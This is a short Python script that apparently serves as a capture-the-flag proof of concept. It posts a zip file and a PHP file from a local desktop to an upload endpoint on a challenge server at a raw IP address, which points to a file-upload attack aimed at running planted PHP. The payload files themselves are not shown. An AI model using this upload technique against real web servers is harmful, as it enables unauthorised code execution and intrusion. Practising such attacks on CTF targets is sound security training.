import requests

url = 'http://124.71.230.22:23402/example.php?ctf=poc'

file1 = {'file': open('C:/Users/Administrator/Desktop/1.zip', 'r', errors='ignore')}
file2 = {'file1': open('C:/Users/Administrator/Desktop/A.PHP', 'r')}

r = requests.post(url, files=file1)
print(r.text)
r = requests.post(url, files=file2)
print(r.text)
